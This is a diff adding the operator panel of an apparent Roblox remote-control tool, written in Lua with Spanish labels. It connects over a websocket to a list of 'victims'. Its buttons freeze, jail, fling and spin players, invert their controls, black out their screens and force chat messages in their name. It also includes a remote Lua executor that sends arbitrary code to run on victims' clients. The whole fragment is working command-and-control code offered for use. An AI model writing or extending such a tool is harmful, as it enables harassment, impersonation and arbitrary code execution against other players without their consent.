+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if root then
+        local p = root.Position
+        sendCmd("bring", {position = {x = p.X, y = p.Y, z = p.Z}})
+    end
+end)
+makeActionBtn("\xF0\x9F\xA7\x8A Freeze (Congelar)", Color3.fromRGB(30, 80, 100), function() sendCmd("freeze") end)
+makeActionBtn("\xF0\x9F\x94\xA5 Unfreeze (Descongelar)", Color3.fromRGB(110, 60, 20), function() sendCmd("unfreeze") end)
+makeActionBtn("\xE2\x9B\xA9\xEF\xB8\x8F Jaula de Ne\xC3\xB3n", Color3.fromRGB(80, 35, 90), function() sendCmd("jail") end)
+makeActionBtn("\xF0\x9F\x94\x93 Quitar Jaula", Color3.fromRGB(50, 45, 70), function() sendCmd("unjail") end)
+makeActionBtn("\xF0\x9F\x93\xB3 Terremoto (Sacudir)", Color3.fromRGB(80, 60, 30), function() sendCmd("earthquake") end)
+makeActionBtn("\xF0\x9F\x8C\x91 Apag\xC3\xB3n (Pantalla Negra)", Color3.fromRGB(30, 30, 40), function() sendCmd("blackout") end)
+makeActionBtn("\xF0\x9F\x9A\x80 Fling Supremo", Color3.fromRGB(80, 30, 100), function() sendCmd("fling") end)
+makeActionBtn("\xF0\x9F\x94\x84 Spin Infinito", Color3.fromRGB(40, 70, 90), function() sendCmd("spin") end)
+makeActionBtn("\xF0\x9F\x9B\x91 Detener Spin", Color3.fromRGB(50, 45, 70), function() sendCmd("unspin") end)
+makeActionBtn("\xF0\x9F\x94\x80 Invertir Controles", Color3.fromRGB(110, 45, 70), function() sendCmd("invert_controls") end)
+makeActionBtn("\xF0\x9F\x94\x84 Restaurar Controles", Color3.fromRGB(45, 80, 70), function() sendCmd("restore_controls") end)
+makeActionBtn("\xF0\x9F\x8F\x83 Super Speed (250)", Color3.fromRGB(30, 90, 70), function() sendCmd("super_speed") end)
+makeActionBtn("\xF0\x9F\x90\x8C Velocidad Tortuga (3)", Color3.fromRGB(70, 70, 30), function() sendCmd("snail_speed") end)
+makeActionBtn("\xE2\x9A\x96\xEF\xB8\x8F Velocidad Normal (16)", Color3.fromRGB(50, 60, 80), function() sendCmd("normal_speed") end)
+
+local MsgTitle = Instance.new("TextLabel")
+MsgTitle.Size = UDim2.new(1, 0, 0, 20)
+MsgTitle.Position = UDim2.new(0, 0, 0, 4)
+MsgTitle.BackgroundTransparency = 1
+MsgTitle.Text = "\xF0\x9F\x93\x9D Mensaje Personalizado:"
+MsgTitle.TextColor3 = Color3.fromRGB(220, 210, 240)
+MsgTitle.Font = Enum.Font.GothamBold
+MsgTitle.TextSize = 12
+MsgTitle.TextXAlignment = Enum.TextXAlignment.Left
+MsgTitle.Parent = Tab2Frame
+
+local MsgBox = Instance.new("TextBox")
+MsgBox.Size = UDim2.new(1, 0, 0, 36)
+MsgBox.Position = UDim2.new(0, 0, 0, 28)
+MsgBox.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+MsgBox.Text = "Has sido trolleado por Sacred Rivals!"
+MsgBox.PlaceholderText = "Escribe el mensaje aqu\xC3\xAD..."
+MsgBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+MsgBox.Font = Enum.Font.Gotham
+MsgBox.TextSize = 12
+MsgBox.ClearTextOnFocus = false
+MsgBox.Parent = Tab2Frame
+
+local MsgCorner = Instance.new("UICorner")
+MsgCorner.CornerRadius = UDim.new(0, 6)
+MsgCorner.Parent = MsgBox
+
+local MsgStroke = Instance.new("UIStroke")
+MsgStroke.Color = Color3.fromRGB(70, 50, 100)
+MsgStroke.Thickness = 1
+MsgStroke.Parent = MsgBox
+
+local ScreenMsgBtn = Instance.new("TextButton")
+ScreenMsgBtn.Size = UDim2.new(0.5, -4, 0, 34)
+ScreenMsgBtn.Position = UDim2.new(0, 0, 0, 70)
+ScreenMsgBtn.BackgroundColor3 = Color3.fromRGB(130, 40, 60)
+ScreenMsgBtn.Text = "\xF0\x9F\x93\xA2 Banner en Pantalla"
+ScreenMsgBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreenMsgBtn.Font = Enum.Font.GothamBold
+ScreenMsgBtn.TextSize = 11
+ScreenMsgBtn.Parent = Tab2Frame
+
+local ScreenMsgCorner = Instance.new("UICorner")
+ScreenMsgCorner.CornerRadius = UDim.new(0, 6)
+ScreenMsgCorner.Parent = ScreenMsgBtn
+
+local screenMsgDebounce = false
+ScreenMsgBtn.MouseButton1Click:Connect(function()
+    if screenMsgDebounce then return end
+    screenMsgDebounce = true
+    sendCmd("screen_alert", {message = MsgBox.Text})
+    local orig = ScreenMsgBtn.BackgroundColor3
+    ScreenMsgBtn.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
+    task.delay(1, function()
+        pcall(function()
+            ScreenMsgBtn.BackgroundColor3 = orig
+            screenMsgDebounce = false
+        end)
+    end)
+end)
+
+local ChatMsgBtn = Instance.new("TextButton")
+ChatMsgBtn.Size = UDim2.new(0.5, -4, 0, 34)
+ChatMsgBtn.Position = UDim2.new(0.5, 4, 0, 70)
+ChatMsgBtn.BackgroundColor3 = Color3.fromRGB(50, 70, 130)
+ChatMsgBtn.Text = "\xF0\x9F\x92\xAC Forzar en Chat"
+ChatMsgBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChatMsgBtn.Font = Enum.Font.GothamBold
+ChatMsgBtn.TextSize = 11
+ChatMsgBtn.Parent = Tab2Frame
+
+local ChatMsgCorner = Instance.new("UICorner")
+ChatMsgCorner.CornerRadius = UDim.new(0, 6)
+ChatMsgCorner.Parent = ChatMsgBtn
+
+local chatMsgDebounce = false
+ChatMsgBtn.MouseButton1Click:Connect(function()
+    if chatMsgDebounce then return end
+    chatMsgDebounce = true
+    sendCmd("chat", {message = MsgBox.Text})
+    local orig = ChatMsgBtn.BackgroundColor3
+    ChatMsgBtn.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
+    task.delay(1, function()
+        pcall(function()
+            ChatMsgBtn.BackgroundColor3 = orig
+            chatMsgDebounce = false
+        end)
+    end)
+end)
+
+local LuaTitle = Instance.new("TextLabel")
+LuaTitle.Size = UDim2.new(1, 0, 0, 20)
+LuaTitle.Position = UDim2.new(0, 0, 0, 114)
+LuaTitle.BackgroundTransparency = 1
+LuaTitle.Text = "\xF0\x9F\x92\xBB Ejecutor Lua Remoto (1 solo a la vez):"
+LuaTitle.TextColor3 = Color3.fromRGB(220, 210, 240)
+LuaTitle.Font = Enum.Font.GothamBold
+LuaTitle.TextSize = 12
+LuaTitle.TextXAlignment = Enum.TextXAlignment.Left
+LuaTitle.Parent = Tab2Frame
+
+local LuaBox = Instance.new("TextBox")
+LuaBox.Size = UDim2.new(1, 0, 0, 70)
+LuaBox.Position = UDim2.new(0, 0, 0, 138)
+LuaBox.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+LuaBox.Text = "print('Hola desde el Master')"
+LuaBox.PlaceholderText = "Escribe el c\xC3\xB3digo Lua a ejecutar..."
+LuaBox.TextColor3 = Color3.fromRGB(180, 255, 180)
+LuaBox.Font = Enum.Font.Code
+LuaBox.TextSize = 11
+LuaBox.TextXAlignment = Enum.TextXAlignment.Left
+LuaBox.TextYAlignment = Enum.TextYAlignment.Top
+LuaBox.ClearTextOnFocus = false
+LuaBox.MultiLine = true
+LuaBox.Parent = Tab2Frame
+
+local LuaCorner = Instance.new("UICorner")
+LuaCorner.CornerRadius = UDim.new(0, 6)
+LuaCorner.Parent = LuaBox
+
+local LuaStroke = Instance.new("UIStroke")
+LuaStroke.Color = Color3.fromRGB(70, 50, 100)
+LuaStroke.Thickness = 1
+LuaStroke.Parent = LuaBox
+
+local LuaExecBtn = Instance.new("TextButton")
+LuaExecBtn.Size = UDim2.new(1, 0, 0, 36)
+LuaExecBtn.Position = UDim2.new(0, 0, 0, 216)
+LuaExecBtn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+LuaExecBtn.Text = "\xE2\x96\xB6\xEF\xB8\x8F EJECUTAR LUA (1 VEZ HASTA ENVIAR OTRO)"
+LuaExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+LuaExecBtn.Font = Enum.Font.GothamBold
+LuaExecBtn.TextSize = 11
+LuaExecBtn.Parent = Tab2Frame
+
+local LuaExecCorner = Instance.new("UICorner")
+LuaExecCorner.CornerRadius = UDim.new(0, 6)
+LuaExecCorner.Parent = LuaExecBtn
+
+LuaExecBtn.MouseButton1Click:Connect(function()
+    if isExecutingLua then return end
+    local codeToRun = LuaBox.Text
+    if not codeToRun or #string.gsub(codeToRun, "%s+", "") == 0 then return end
+
+    isExecutingLua = true
+    LuaExecBtn.Text = "\xE2\x8F\xB3 Enviando..."
+    LuaExecBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 130)
+
+    local ok = sendCmd("execute", {code = codeToRun})
+
+    if ok then
+        LuaExecBtn.Text = "\xE2\x9C\x85 Ejecutado (1 sola vez)"
+        LuaExecBtn.BackgroundColor3 = Color3.fromRGB(35, 130, 80)
+    else
+        LuaExecBtn.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error al enviar"
+        LuaExecBtn.BackgroundColor3 = Color3.fromRGB(130, 40, 40)
+    end
+
+    task.delay(1.5, function()
+        pcall(function()
+            LuaExecBtn.Text = "\xE2\x96\xB6\xEF\xB8\x8F EJECUTAR LUA (1 VEZ HASTA ENVIAR OTRO)"
+            LuaExecBtn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+            isExecutingLua = false
+        end)
+    end)
+end)
+
+task.spawn(function()
+    connectWS()
+    task.wait(1)
+    refreshList()
+    while true do
+        task.wait(15)
+        if not wsConnected or not currentSocket then
+            connectWS()
+        else
+            local pingOk = pcall(function()
+                currentSocket:Send(HttpService:JSONEncode({type = "ping"}))
+            end)
+            if not pingOk then
+                wsConnected = false
+                currentSocket = nil
+                connectWS()
+            end
+            local now = tick()
+            local changed = false
+            for name, info in pairs(connectedVictims) do
+                if now - (info.lastSeen or now) > 35 then
+                    connectedVictims[name] = nil
+                    changed = true
+                end
+            end
+            if changed and rebuildVictimsUI then rebuildVictimsUI() end
+        end
+    end
+end)
